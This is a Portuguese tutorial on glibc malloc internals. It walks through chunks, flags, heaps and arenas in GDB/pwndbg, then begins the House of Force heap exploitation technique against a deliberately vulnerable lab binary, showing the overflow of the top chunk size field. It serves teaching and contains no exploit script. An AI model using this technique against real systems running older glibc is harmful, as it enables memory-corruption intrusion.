<p>Utilizando o “<strong>ldd</strong>” (<em>List Dynamic Dependences</em>) no programa “<code class="language-plaintext highlighter-rouge">/bin/ls</code>” para listar as bibliotecas utilizadas, podemos observar todas as bibliotecas necessárias para seu funcionamento, como a <code class="language-plaintext highlighter-rouge">libselinux</code> e <code class="language-plaintext highlighter-rouge">libpthread</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_1.png" alt="Bibliotecas utilizadas" /></p>

<p>Entre estas bibliotecas, existe uma chamada “<code class="language-plaintext highlighter-rouge">libc.so.6</code>”. Este é o objeto compartilhado da GLIBC. Onde <code class="language-plaintext highlighter-rouge">libc</code> é frequentemente a contração de GLIBC e o “<code class="language-plaintext highlighter-rouge">.so</code>” vem de <em>shared object</em> ou objeto compartilhado, o “<code class="language-plaintext highlighter-rouge">6</code>” é parte da <em>Linux Library ABI Versioning Convention</em> conhecida como <em><code class="language-plaintext highlighter-rouge">soname</code></em>. A referência para a <em>ABI Policy and Guidelines</em> pode ser encontrada em <a href="https://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html">gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html</a>.</p>

<p>O comando <code class="language-plaintext highlighter-rouge">file</code> nos mostra que a <code class="language-plaintext highlighter-rouge">libc.so.6</code> é um link simbólico para a <code class="language-plaintext highlighter-rouge">libc-2.31.so</code> conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_2.png" alt="Link simbólico" /></p>

<p>Este é o objeto compartilhado atual, o <code class="language-plaintext highlighter-rouge">2.31</code> indica a versão da GLIBC que é diferente do <em>soname</em>.</p>

<p>A maior parte dos sistemas operacionais Linux, são distribuições com versões da GLIBC específica que não mudam durante o período de suporte.</p>

<p>No exemplo, vimos que o Debian 11 LTS utiliza a GLIBC 2.31 e vai continuar com esta versão pelos próximos cinco anos após seu lançamento. As excessões a esta regra, são distribuições como Arch Linux que atualizam suas versões da GLIBC constantemente.</p>

<p>Se executarmos o o objeto compartilhado da GLIBC, podemos ver não só sua versão, como a versão do GCC utilizada para compilá-lo, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_3.png" alt="Executando a GLIBC" /></p>

<p>Em resumo, esta biblioteca tem papel fundamental em um sistema operacional baseado no kernel do Linux, e suas funcionalidades.</p>

<h2 id="malloc">MALLOC</h2>

<p>Além das bibliotecas fundamentais, a GLIBC fornece um “alocador de memódia dinâmica” conhecido como <code class="language-plaintext highlighter-rouge">malloc</code>.</p>

<p>Os alocadores de memória dinâmica são utilizados quando um programa não consegue identificar o tamanho e/ou o número de objetos compartilhados que precisa para seu funcionamento em tempo de execução.</p>

<p>E o trabalho da <code class="language-plaintext highlighter-rouge">malloc</code> é simplesmente servir “pedaços” desta memória dinâmica, chamados de “<code class="language-plaintext highlighter-rouge">chunks</code>” em tempo de execução. Estes <code class="language-plaintext highlighter-rouge">chunks</code> são originados em grandes regiões da memória dinâmica chamados <code class="language-plaintext highlighter-rouge">heaps</code>.</p>

<p>Em um conceito abstrato, as <code class="language-plaintext highlighter-rouge">heaps</code> nada mais são do que grandes blocos de memória requisitados do kernel pela malloc.</p>

<p>Mesmo que um código em C ou C++ não invoque a malloc explicitamente, as chances que uma das bibliotecas utilizadas no código a utilize são grandes.</p>

<p>Operações básicas como iniciar uma nova <em>thread</em>, abrir um arquivo ou lidar com I/O, todas utilizam a malloc em <em>background</em>.</p>

<p>Portanto, como a malloc é largamente utilizada, combinada ao fato de que ela é usada em linguagens como C e C++, onde a corrupção de memória ainda é um problema, ela se torna um grande alvo para exploração.</p>

<h2 id="chunks">Chunks</h2>

<p><code class="language-plaintext highlighter-rouge">Chunks</code> são a unidade de memória fundamental na malloc, tomando a forma de pedaços da <code class="language-plaintext highlighter-rouge">heap</code>, embora eles também possam ser criados como uma entidade separada por uma chamada para o <code class="language-plaintext highlighter-rouge">mmap()</code>. A estrutura de um <em>chunk</em> consiste em um campo de tamanho, chamado de <em><code class="language-plaintext highlighter-rouge">size field</code></em> seguido do campo de “dados do usuário” chamado de <em><code class="language-plaintext highlighter-rouge">user data</code></em> que é o campo utilizado pelos programas. A figura abaixo representa o layout de um chunk.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_4.png" alt="Arquitetura do chunk" /></p>

<p>Enquanto os programas utilizam somente o campo <code class="language-plaintext highlighter-rouge">user data</code>, a malloc considera que o chunk começa 8 bytes antes do <code class="language-plaintext highlighter-rouge">size field</code>.</p>

<h3 id="size-field">Size field</h3>

<p>O <em>size field</em> tem um tamanho de 8 bytes e indica a quantidade de bytes utilizados pelo <em>user data</em> mais a quantidade de bytes do próprio <em>size field</em>.<br />
Exemplificando o valor do <em>size field</em>, com um chunk com 24 bytes de <em>user data</em> o <em>size field</em> terá o valor de “<code class="language-plaintext highlighter-rouge">0x20</code>” bytes, ou 32 bytes, que compreendem os 24 bytes solicutados pelo programa e reservados ao <em>user data</em>, mais os 8 bytes do próprio <em>size field</em>. O valor mínimo de um chunk é de <code class="language-plaintext highlighter-rouge">0x20</code> bytes.</p>

<p>O tamanho de um <em>chunk</em> aumenta em incrementos de 16 bytes, isso significa que, a partir do tamanho mínimo de <code class="language-plaintext highlighter-rouge">0x20</code> bytes de um <em>chunk</em>, o próximo tamanho possível é de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, o próximo de <code class="language-plaintext highlighter-rouge">0x40</code> bytes e assim por diante.<br />
Uma particularidade do <em>size field</em>, é que a última parcela sognificante do seu valor não é usado para representar seu tamanho, mas sim para armazenar <em>flags</em> que indicam o estado do <em>chunk</em>. Estas <em>flags</em> podem ser:</p>

<ul>
  <li><strong>NON_MAIN_ARENA</strong> - Quando utilizado, indica que o <em>chunk</em> não pertence a <code class="language-plaintext highlighter-rouge">main arena</code> (detalhes sobre arenas mais abaixo)</li>
  <li><strong>IS_MAPPED</strong> - quando utilizado, indica que o <em>chunk</em> foi alocado via <code class="language-plaintext highlighter-rouge">mmap()</code></li>
  <li><strong>PREV_INUSE</strong> - Quando utilizado, indica que o <em>chunk</em> anterior está em uso, quando não utilizado, indica que o <em>chunk</em> anterior está livre.</li>
</ul>

<p>A imagem abaixo motra as <em>flags</em> na arquitetura do <em>chunk</em>:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_5.png" alt="Arquitetura do chunk" /></p>

<h3 id="user-data-field">User data field</h3>

<p>O campo de <code class="language-plaintext highlighter-rouge">user data</code> contém a memória disponível para o processo que a requisitou. Este campo, pode conter informações relevantes para o <em>chunk</em>.</p>

<p>Tendo como fundamento de que um <em>chunk</em> pode ter somente 2 estados: <code class="language-plaintext highlighter-rouge">allocated</code> ou <code class="language-plaintext highlighter-rouge">free</code>, quando um chunk está livre, pode ser reaproveitado para armazenar informações sobre o fluxo de execução. Neste caso o primeiro <code class="language-plaintext highlighter-rouge">quadword</code> (8 bytes) é reaproveitado como um <code class="language-plaintext highlighter-rouge">foward pointer</code> (fd). O segundo <em>quadword</em> é reaproveitado como um <code class="language-plaintext highlighter-rouge">backward pointer</code> (bk). Os terceiro e quartos <em>quadwords</em> são reaproveitados como apontadores <code class="language-plaintext highlighter-rouge">fd_nextsize</code> e <code class="language-plaintext highlighter-rouge">bk_nextsize</code>  respectivamente. A partir do quinto <em>quadword</em>, o <em>user data</em> é reaproveitado para armazenar metadados ou se tornar parte do <em>chunk</em> seguinte.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_6.png" alt="Arquitetura do chunk" /></p>

<h2 id="heaps">Heaps</h2>

<p><code class="language-plaintext highlighter-rouge">Heaps</code> são blocos de memória adjacentes, dos quais a malloc aloca a processos. Elas podem ser criadas, aumentadas, separadas ou destruídas.</p>

<p>As <em>heaps</em> são administradas de formas diferentes, caso pertençam a uma <code class="language-plaintext highlighter-rouge">main arena</code> ou não. Uma <em>heap</em> que seja criada na primeira requisição de memória dinâmica, pertence a uma <code class="language-plaintext highlighter-rouge">main arena</code>, <em>heaps</em> para outras <code class="language-plaintext highlighter-rouge">arenas</code> são criadas pela função <code class="language-plaintext highlighter-rouge">new_heap()</code>.</p>

<p>Uma <em>heap</em> que faça parte de uma <code class="language-plaintext highlighter-rouge">main arena</code> pode ser aumentada ou separada pela <em>syscall</em> <code class="language-plaintext highlighter-rouge">brk()</code>, que por sua vez tem a função de requisitar mais memória, ou retornar memória para o kernel.</p>

<p>Uma <em>heap</em> que não pertença a uma <code class="language-plaintext highlighter-rouge">main arena</code> é criada com um tamanho fixo e seu tamanho pode ser manipulado com os comandos <code class="language-plaintext highlighter-rouge">grow_heap()</code> e <code class="language-plaintext highlighter-rouge">shrink_heap()</code> que aumentam ou diminuem o espaço para escrita. Estas também podem ser destruídas pela macro <code class="language-plaintext highlighter-rouge">delete_heap()</code>.</p>

<h2 id="arenas">Arenas</h2>

<p>A malloc administra os processos das <em>heaps</em> utilizando a estrutura <code class="language-plaintext highlighter-rouge">malloc_state</code>, conhecida como <code class="language-plaintext highlighter-rouge">arena</code>. Estas arenas consistem primordialmente em “bins”, que são utilizados para reciclar <em>chunks</em> livres da memória <em>heap</em>. Uma única arena, pode administrar multiplos <em>heaps</em> simultaneamente.</p>

<p>Novas arenas podem ser criadas através da função <code class="language-plaintext highlighter-rouge">_int_new_arena()</code> e inicializadas com <code class="language-plaintext highlighter-rouge">malloc_init_state()</code>.</p>

<p>A quantidade máxima de arenas concorrentes depende da quantidade de <em>cores</em> disponíveis para o processo.</p>

<h2 id="analisando-o-comportamento-em-tempo-de-execução">Analisando o comportamento em tempo de execução</h2>

<p>Para melhor compreensão de como é o comportamento da <em>heap</em> em tempo de execução, vamos analisar duas principais funções da malloc: a <code class="language-plaintext highlighter-rouge">malloc()</code> e a <code class="language-plaintext highlighter-rouge">free()</code>, que requisitam memória dinâmica ao kernel e liberam memória de volta para o kernell respectivamente.</p>

<h3 id="função-malloc">Função malloc()</h3>

<p>A princípio, pode ser um pouco confuso existir uma função chamada <code class="language-plaintext highlighter-rouge">malloc()</code> que requisita memória do alocador de memória dinâmica chamado malloc.</p>

<p>Porém, se trata de uma simples função que leva somente um argumento: a quantidade de bytes requisitados e retorna o *pointer para ele. A imagem abaixo exemplifica seu uso.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_7.png" alt="Formato da malloc()" /></p>

<p>E para visualizar como a memória <em>heap</em> é requisitada via <code class="language-plaintext highlighter-rouge">malloc()</code>, vamos “debugar” um pequeno e simples binário.</p>

<p>Como ferramentas para este laboratório, serão utilizadas os seguintes recursos:</p>

<ul>
  <li>Binários auxiliares obtidos no GitHub HeapLab (<a href="https://github.com/limitedeternity/HeapLAB">github.com/limitedeternity/HeapLAB</a>)</li>
  <li>GDB (GNU Debugger)</li>
  <li>O plugin PWNDBG (encontrado em <a href="https://github.com/pwndbg/pwndbg">github.com/pwndbg/pwndbg</a>)</li>
  <li>O binário “malloc” encontrado no material auxiliar deste paper</li>
</ul>

<p>Dentro do diretório do binário, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">gdb malloc</code> que vai iniciar o binário junto ao gdb.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_8.png" alt="Iniciando o GDB" /></p>

<p>Antes de executar o binário em questão, podemos criar um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main()</code> com o comando <code class="language-plaintext highlighter-rouge">breakpoint main</code> ou simplesmente <code class="language-plaintext highlighter-rouge">b main</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_9.png" alt="Breakpoint na main()" /></p>

<p>Com o <em>breakpoint</em> configurado, podemos executar o binário com o comando <code class="language-plaintext highlighter-rouge">run</code> ou simplesmente <code class="language-plaintext highlighter-rouge">r</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_10.png" alt="Tela inicial PWNDBG" /></p>

<p>O PWNDBG nos mostra um painel completo com várias informações sobre os movimentos de registradores que o binário está efetuando neste momento, assim como a <em>stack</em> e um painel chamado <code class="language-plaintext highlighter-rouge">SOURCE (CODE)</code>.</p>

<p>O painel SOURCE (CODE) nos mostra o código fonte do binário (que se encontra junto ao material auxiliar deste paper) e uma seta apontando a exata instrução onde o binário está parado no momento, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_11.png" alt="Source code" /></p>

<p>Podemos ver que a próxima instrução a ser executada é uma requisição de 9 bytes utilizando a função <code class="language-plaintext highlighter-rouge">malloc()</code>.</p>

<p>Antes de dar continuidade a execução, podemos visualizar o mapeamento da memória deste processo com o comando <code class="language-plaintext highlighter-rouge">vmmap</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_12.png" alt="VMMAP" /></p>

<p>No terminal utilizado para este experimento, podemos ver na legenda superior que a <em>heap</em> será indicada com a cor azul, porém no mapeamento ainda não existe nenhuma entrada na cor azul. isto acontece, porque neste momento da execução, ainda não existe nenhuma requisição de memória dinâmica feita pelo binário.</p>

<p>Podemos utilizar o comando <code class="language-plaintext highlighter-rouge">next</code> ou simplesmente <code class="language-plaintext highlighter-rouge">n</code> para avançar o binário para a próxima instrução.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_13.png" alt="Avançando a execução" /></p>

<p>Neste momento, é possível observar que o binário executou a primeira requisição de memória dinâmica, e está parada antes de executar a segunda, na linha 7 do código fonte.</p>

<p>Agora, ao checar a saída do comando <code class="language-plaintext highlighter-rouge">vmmap</code> podemos ver uma <em>heap</em> no endereço <code class="language-plaintext highlighter-rouge">0x602000</code> com o tamanho de <code class="language-plaintext highlighter-rouge">0x21000</code> bytes, ou pouco mais que 135000 bytes.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_14.png" alt="Heap" /></p>

<p>Também podemos inspecionar esta memória <em>heap</em> com o comando <code class="language-plaintext highlighter-rouge">vis_heap_chunks</code> ou simplesmente <code class="language-plaintext highlighter-rouge">vis</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_15.png" alt="Arquitetura do chunk" /></p>

<p>Nas cores do terminal utilizado no experimento, podemos ver os caracteres em ciano, que representam o primeiro <em>chunk</em> requisitado pela malloc com 9 bytes. Isto pode ser confirmado com o comando <code class="language-plaintext highlighter-rouge">print a</code> ou <code class="language-plaintext highlighter-rouge">p a</code> que vai nos mostrar que o valor de retorno desta chamada aponta para o primeiro <em>quadword</em> deste <em>chunk</em>, que representa nosso <code class="language-plaintext highlighter-rouge">user data</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_16.png" alt="Endereço da user data" /></p>

<p>A primeira coisa que podemos notar, é que mesmo requisitando somente 9 bytes, a <em>heap</em> alocou 3 <em>quadwords</em>, ou 24 bytes no <em>user data</em>, pois este é o tamanho de <em>chunk</em> minimo que a malloc oferece.</p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">n</code> novamente, veremos que o programa requisitará somente 1 byte da memória.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_17.png" alt="Avançando a execução" /></p>

<p>E o comando <code class="language-plaintext highlighter-rouge">vis</code> nos mostra que ainda assim, a malloc alocou 24 bytes de memória.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_18.png" alt="Arquitetura do chunk" /></p>

<p>Mesmo solicitando 0 bytes com o comando <code class="language-plaintext highlighter-rouge">n</code> a malloc ainda aloca 24 bytes no <em>user data</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_19.png" alt="Avançando a execução" /></p>

<p>Neste ponto, é possível verificar que antes do campo <em>user data</em>, existe outro campo que ainda faz parte do mesmo chunk, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_20.png" alt="Avançando a execução" /></p>

<p>Assim como uma <em>stack</em> armazena metadados próprios como endereços de retorno e apontadores, a malloc utiliza este campo para armazenar metadados da <em>heap</em> na própria <em>heap</em>, especificamente neste caso, o <em>size field</em>.</p>

<p>Todo <em>chunk</em> possui um <em>size field</em> indicando o tamanho total em bytes que compõem o <em>chunk</em>, incluindo o próprio <em>size field</em>. Então neste caso, temos 24 bytes de <em>user data</em>, mais 8 bytes de <em>size field</em> totalizando 32 ou <code class="language-plaintext highlighter-rouge">0x20</code> bytes. No entanto, estamos vendo <code class="language-plaintext highlighter-rouge">0x21</code> bytes, isso ocorre porque o <em>chunk</em> também carrega <em>flags</em> que são inseridas no último bit significante do byte. O acreścimeo de <code class="language-plaintext highlighter-rouge">0x01</code> ao tamanho do <em>chunk</em>, indica que a flag <code class="language-plaintext highlighter-rouge">_prev_inuse</code> está ativa e o <em>chunk</em> anterior está em uso.</p>

<p>O tamanho dos <em>chunks</em> cresce em incrementos de 16 bytes. Por exemplo, se utilizarmos o comando <code class="language-plaintext highlighter-rouge">n</code> para requisitar exatamente 24 bytes de memória <em>heap</em>, o comando <code class="language-plaintext highlighter-rouge">vis</code> nos mostra que alocamos um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes com exatamente 24 bytes de <em>user data</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_21.png" alt="Avançando a execução" /></p>

<p>Agora se avançarmos na execução do binário e solicitarmos 25 bytes de <em>user data</em>, <code class="language-plaintext highlighter-rouge">vis</code> nos mostra que desta vez o tamanho do <em>chunk</em> alocado é de <code class="language-plaintext highlighter-rouge">0x30</code> bytes com 40 bytes de <em>user data</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_22.png" alt="Avançando a execução" /></p>

<p>Por último, daremos atenção para o campo <code class="language-plaintext highlighter-rouge">top chunk</code> conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_23.png" alt="Chunk com 0x30 bytes" /></p>

<p>Se voltarmos ao comando <code class="language-plaintext highlighter-rouge">vmmap</code> veremos que quando executamos a <code class="language-plaintext highlighter-rouge">malloc()</code> da primeira vez, foi criado uma <em>heap</em> com <code class="language-plaintext highlighter-rouge">0x21000</code> bytes, ou pouco mais que 135.000 bytes. Mas neste momento, estamos vendo uma quantidade menor no <code class="language-plaintext highlighter-rouge">top chunk</code>.</p>

<p>Isto ocorre porque a malloc nos mostra o restante dos bytes da <em>heap</em>, como bytes não utilizados, indicando que a memória <em>heap</em> é um único e grande <em>chunk</em>   chamado de <code class="language-plaintext highlighter-rouge">top chunk</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_24.png" alt="Top chunk" /></p>

<p>Toda vez que solicitamos um <em>chunk</em> através da malloc, o <em>top chunk</em> é quebrado para fornecer bytes aos <em>chunks</em> solicitados diminuindo seu tamanho total, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_25.png" alt="Top chunk" /></p>

<p>A <em>top chunk</em>, assim como as demais também possui um <em>size field</em>, que indica a quantidade de bytes disponíveis para serem requisitados pela malloc.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_26.png" alt="Top chunk size" /></p>

<p>O <em>size field</em> do <em>top chunk</em> pode ser visto neste campo:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_27.png" alt="Top chunk size" /></p>

<p>Uma observação importante sobre este campo, é que em muitas versões da GLIBC, o <em>size field</em> da top chunk não é submetido a nenhuma checagem de integridade, e isto se torna a base da técnica de exploração conhecida como <code class="language-plaintext highlighter-rouge">The House of Force</code>.</p>

<h1 id="the-house-of-force">THE HOUSE OF FORCE</h1>

<p>A técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>, é uma das masi básicas possíveis em exploração de memória <em>heap</em> tendo sua principal vulnerabilidade o <em>overflow</em>.</p>

<p>Neste momento, vamos utilizar um simples binário escrito em C, para entender a base da técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>. Este é um binário propositalmente vulnerável feito exatamente para o entendimento da vulnerabilidade.</p>

<p>Para explorarmos este binário, além das ferramentas já utilizadas anteriormente, vamos utilizar o módulo <code class="language-plaintext highlighter-rouge">pwntools</code> do Python.</p>

<h2 id="enumeração-do-binário">Enumeração do binário</h2>

<p>Para que o comportamento de um binário seja entendido, é necessário que seja enumerado, duas formas possíveis de enumerá-lo, é analisando seus mecanismos de proteção de forma passiva, e analisando seu comportamento em tempo de execução.</p>

<h3 id="enumerando-com-checksec">Enumerando com checksec</h3>

<p>Junto com o módulo pwntools, é instalada a ferramenta <code class="language-plaintext highlighter-rouge">checksec</code> que encontra dados sobre como um binário foi compilado compilado e algumas <em>flags</em> importantes sobre como podemos explorá-lo.<br />
Neste momento, vamos utilizar o binário <code class="language-plaintext highlighter-rouge">house_of_force</code> que se encontra no material complementar deste estudo. Utilizando o comando <code class="language-plaintext highlighter-rouge">checksec house_of_force</code> temos as primeiras informações sobre o binário.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_28.png" alt="Enumerando com checksec" /></p>

<p>Neste momento podemos identificar que se trata de um binário de 64 bits, conforme ressaltado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_29.png" alt="Arquitetura 64 bits" /></p>

<p>Também foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>.</p>
<blockquote>
  <p><code class="language-plaintext highlighter-rouge">Partial RELRO</code> é uma mitigação que muda o layout das seções do programa, enquanto a <code class="language-plaintext highlighter-rouge">Full RELRO</code> também mapea algumas destas seções como <code class="language-plaintext highlighter-rouge">read only</code> após sua inicialização. Porém, uma vez que as explorações ocorrerão primordialmente na GLIBC, esta proteção não será problema.</p>
</blockquote>

<p><img src="/img/papers/heap_p1/paper_heap1_30.png" alt="Full RELRO" /></p>

<p>O binário também foi compilado utilizando <code class="language-plaintext highlighter-rouge">Stack Canary</code> que gera um <em>cookie</em> na pilha e checa sua integridade após a chamada de uma função, também é uma mitigação de exploração da qual não afetará a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_31.png" alt="Stack Canary" /></p>

<p>Este binário também foi compilado com o byte <code class="language-plaintext highlighter-rouge">NX</code> (<em>No eXecute</em>), também conhecido como <code class="language-plaintext highlighter-rouge">DEP</code> (<em>Data Execution Prevention</em>) esta também é uma mitigação de exploração que faz com que áreas como a <em>stack</em> não sejam executáveis, impedindo a execução de <em>shellcodes</em> diretamente da pilha.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_32.png" alt="Enumerando com checksec" /></p>

<p>Também podemos observar que este binário não tem o <code class="language-plaintext highlighter-rouge">PIE</code> (<em>Position Independent Executable</em>) ativado, o que significa que durante sua execução, saberemos os endereços na memória, pois eles serão estáticos.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_33.png" alt="No PIE" /></p>

<p>Por ultimo, o <code class="language-plaintext highlighter-rouge">RUNPATH</code> mostra que este binário vai procurar por bibliotecas GLIBC em um diretório em que o usuário pode controlar. Todos os binários deste estudo tem seu diretório de execução modificados, isto facilita a forma como podemos ligar os binários em diferentes versões da GLIBC. Em um cenário real, isto é irrelevante.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_34.png" alt="RUNPATH" /></p>

<h3 id="enumerando-em-tempo-de-execução">Enumerando em tempo de execução</h3>

<p>O binário <code class="language-plaintext highlighter-rouge">house_of_force</code> foi desenvolvido com a finalidade de explorar a técnica de exploração da <em>heap</em>. Ele tem o estilo CTF (<em>Capture the Flag</em>) e um <em>bug</em> proposital.</p>

<p>Para enumerar este binário em tempo de execução, vamos iniciá-lo no GDB e executá-lo sem nenhum <em>breakpoint</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_35.png" alt="Executando o binário" /></p>

<p>O programa inicia com um cabeçalho e dois endereços:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_36.png" alt="Endereços" /></p>

<p>O primeiro, é o endereço da função <code class="language-plaintext highlighter-rouge">puts()</code> dentro da GLIBC, do qual podemos utilizar posteriormente durante a exploração. O segundo, é o endereço inicial da primeira <em>heap</em>.</p>

<p>É importante salientar que “vazar” os endereços da <em>heap</em> e da GLIBC é possível via corrupção da própria <em>heap</em>, porém, como estamos utilizando um binário exclusivamente feito para aprendizado da técnica, o próprio binário nos da esta informação sem uso de nenhum tipo de exploração, para que o único foco seja o aprendizado da técnica.</p>

<p>Abaixo dos endereços, está um menu com opções numéricas.<br />
A primeira opção, nos permite requisitar até quatro <em>chunks</em> da memória <em>heap</em>, via função <code class="language-plaintext highlighter-rouge">malloc()</code> .</p>

<p>Ao utilizar esta opção, o binário solicita a quantidade de bytes para este <em>chunk</em>, e logo em seguida os dados que o irão preencher, conforme demonstrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_37.png" alt="Criando e preenchendo um chunk" /></p>

<p>Agora que o processo tem uma <em>heap</em>, podemos visualizar em qual estado se encontra, pausando a execução no GDB precionado <code class="language-plaintext highlighter-rouge">Ctrl + c</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_38.png" alt="Verificando estado atual do binário" /></p>

<p>Ao utilisarmos o comando <code class="language-plaintext highlighter-rouge">vis</code>, podemos ver que a <em>heap</em> se inicia no endereço <code class="language-plaintext highlighter-rouge">0x603000</code>, assim como o próprio binário havia nos informado.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_39.png" alt="Visualizando a heap" /></p>

<p>Conforme esperado, a <code class="language-plaintext highlighter-rouge">malloc()</code> alocou um <em>chunk</em> com o tamanho de 24 bytes de <em>user data</em>, asim como requisitado.<br />
Também é possível verificar, que o <em>user data</em> foi preenchido com nossos quatro “A” (41 em hexa) e uma nova linha (0a em hexa) representados em hexadecimal.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_40.png" alt="User data" /></p>

<p>Portanto, este programa nos permite requisitar qualquer tamanho de <em>chunk</em> e preenchê-los com dados.<br />
Vamos coninuar enumerando este binário, como o comando <code class="language-plaintext highlighter-rouge">continue</code> ou simplesmente <code class="language-plaintext highlighter-rouge">c</code> seguido de <code class="language-plaintext highlighter-rouge">Enter</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_41.png" alt="Continuando a execução" /></p>

<p>A opção de número dois, nos mostra o <em>target</em>, no momento, este campo só retorna sete “X”. Como a técnica <em>the house of force</em> nos permite escrita arbitrária, o objetivo inicial desta fase do estudo, é sobrescrever o conteúdo da função <em>target</em> e podermos visualizá-lo com a opção dois do menu.<br />
Lembrando que este binário não possui <code class="language-plaintext highlighter-rouge">PIE</code>, então o endereço dos dados da função <em>target</em> sempre será o mesmo.</p>

<p>Podemos checar a função <em>target</em> no GDB, pausando novamente o programa e utilizando o comando <code class="language-plaintext highlighter-rouge">dq &amp;target</code> (<em>dump quad</em>) que nos mostra os “X” representados por 58 em hexa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_42.png" alt="Endereço e conteúdo da target" /></p>

<p>Estes dados, residem na seção <em>data</em> do binário, para checarmos isso, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">xinfo target</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_43.png" alt="Endereço da data section" /></p>

<p>Continuando a execução do programa, vemos que a opção três, encerra a execução do programa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_44.png" alt="Encerrando o programa" /></p>

<h2 id="arbitrary-write-via-house-of-force">Arbitrary write via House of Force</h2>

<p>Como primeiro objetivo de exploração deste binário, vamos sobrescrever os dados da seção <em>data</em>, correspondente a função <em>target</em>.</p>

<p>Para isto, vamos primeiramente executar o programa no GDB e solicitar um <em>chunk</em> com a opção um do menu. Porém, vamos enviar mais dados do que solicitamos e checar o <em>chunk</em> para medir seu comportamento. No exemplo abaixo, foi solicitado um <em>chunk</em> de 24 bytes, porém foi enviado uma quantidade muito maior de “A”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_45.png" alt="Enviando mais dados que acapacidade" /></p>

<p>Agora podemos pausar o GDB com <code class="language-plaintext highlighter-rouge">Ctrl + c</code> e inspecionar o <em>chunk</em> com <code class="language-plaintext highlighter-rouge">vis</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_46.png" alt="Inspecionando o chunk" /></p>

<p>Podemos ver que que nossos dados preencheram totalmente o <em>user data</em> de 24 bytes, mas também sobrescreveu o <em>top chunck size field</em>. Por tanto, este binário tem um <em>overflow</em> de 8 bytes quando lê os dados nos chunks.</p>

<p>O ponto em questão, é que um unico byte, pode corromper o <em>size field</em> do próximo <em>chunk</em>, porém neste caso, temos o total controle para sobrescrevê-lo. Na técnica <code class="language-plaintext highlighter-rouge">House of Force</code> o objetivo é sobrescrever o <em>size filed</em> do <em>top chunk</em>, assim podemnos utilizar o <em>overflow</em> para controlar que tamanho a malloc “acha” que o <em>top chunk</em> tem.</p>

<p>Isto acontece, pois muitas versões da GLIBC, não possuem um mecanismo para checar a integridade do <em>top chunk size field</em>. A mitigação desta falha, foi implementada somente na versão <code class="language-plaintext highlighter-rouge">2.29</code> da GLIBC, que pode ser encontrado no <code class="language-plaintext highlighter-rouge">diff</code> da implementação (<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=7c8bf8413c54c367031ca274c9bca497a45897f8;hp=9431108626cdc0b5c1972ee00126228c8dd7166f;hb=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f;hpb=30a17d8c95fbfb15c52d1115803b63aaa73a285c">encontrado aqui</a>). Checamos anteriormente a versão da GLIBC utilizada neste binário, com a ferramente <code class="language-plaintext highlighter-rouge">checkec</code>, porém no próprio PWNDBG, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">vmmap libc</code> para confirmar.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_47.png" alt="Versão da GLIBC utilizada" /></p>

<p>Podemos ver que este binário utiliza a versão <code class="language-plaintext highlighter-rouge">2.28</code> da GLIBC, que não tem nenhum sistema para checar a integridade to <em>top chunk size field</em>.</p>
<blockquote>
